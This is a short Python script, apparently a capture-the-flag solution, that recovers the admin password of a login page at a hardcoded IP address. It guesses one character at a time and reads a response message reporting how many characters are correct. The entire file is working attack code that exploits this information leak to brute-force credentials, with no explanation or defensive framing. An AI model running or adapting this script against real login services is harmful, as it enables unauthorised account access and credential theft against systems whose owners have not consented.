import requests

password = ""
for i in range(20):
    password += " "
    for ch in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
        password = password[:-1] + ch
        print(password)
        r = requests.post(
            "http://52.59.124.14:5015/login.php",
            data={"username": "admin", "password": password},
        )
        if "characters correct!" in r.text:
            parts = r.text.split(" ")
            count = int(parts[parts.index("characters") - 1])
            if count == len(password):
                break
        else:
            print(password, r.text)
            exit(0)